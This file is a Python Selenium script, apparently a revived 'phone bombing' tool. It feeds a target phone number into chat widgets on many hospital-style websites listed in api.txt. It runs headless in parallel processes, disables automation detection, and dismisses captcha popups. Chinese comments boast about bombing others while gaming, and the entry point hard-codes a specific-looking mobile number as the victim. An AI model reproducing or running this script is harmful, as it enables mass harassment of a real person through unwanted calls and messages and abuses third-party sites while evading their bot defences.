from multiprocessing import Pool, Queue
import time
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException, NoSuchElementException

#我上网的时候找到这个项目，发现不能用了，于是修改了一些内容，新增几个功能。
#第一，无头模式，不用每次打开窗口。
#第二，限制同时运行的线程数，这样就可以一边玩游戏，一遍愉快的轰炸别人了！
#第三，莆田系页面元素有改变，原来的基本用不了，我重新修改为现在能用，时间是2024年11月18日，截止这个时候，可以正常使用这个元素。
#第四，额，不知道说啥，感谢作者的构想，其实我只懂一点点python，所以做了一点微不足道的修改。
#

def visit_website(url, phone):
    """访问指定 URL 并执行操作"""
    try:
        # 配置 Chrome 浏览器
        options = Options()
        options.add_argument("--headless")  # 无头模式
        options.add_argument("--start-maximized")  # 窗口最大化
        options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36")  # 设置用户代理
        options.add_argument("--disable-blink-features=AutomationControlled")  # 禁用自动化标识

        driver = webdriver.Chrome(options=options)

        # 隐式等待
        driver.implicitly_wait(10)
        driver.get("https://www.baidu.com/")
        driver.get(url)

        # 等待弹窗出现并尝试关闭
        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.CLASS_NAME, "imlp-component-captcha-close"))).click()
        except TimeoutException:
            print("弹窗未出现，继续执行操作。")

        # 切换到最新的窗口
        handles = driver.window_handles
        driver.switch_to.window(handles[-1])

        # 定位输入框并输入内容
        input_box = WebDriverWait(driver, 10).until(
            EC.visibility_of_element_located((By.CSS_SELECTOR, ".imlp-component-typebox-input.pc-imlp-component-typebox-input"))
        )
        input_box.click()  # 点击输入框（如必要）
        input_box.send_keys(phone)

        # 点击发送按钮
        send_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, ".imlp-component-typebox-send-btn.pc-imlp-component-typebox-send"))
        )
        send_button.click()
        
        print(f"URL: {url} 处理成功！")
        driver.quit()
        return True

    except Exception as exc:
        #print(f"错误：{url} 处理失败，错误信息：{exc}")
        return False

        
    finally:
        driver.quit()

def boom(phone):
    """批量处理 URL 列表"""
    with open('api.txt', 'r') as file:
        urls = [line.strip() for line in file.readlines()]

    # 限制并发数量
    with Pool(processes=10) as pool:  # 限制同时运行的进程数为 5
        results = pool.starmap(visit_website, [(url, phone) for url in urls])

    # 统计成功数量
    success_count = sum(results)
    print(f"成功处理的 URL 数量：{success_count}/{len(urls)}")

if __name__ == "__main__":
    boom("18988064424")
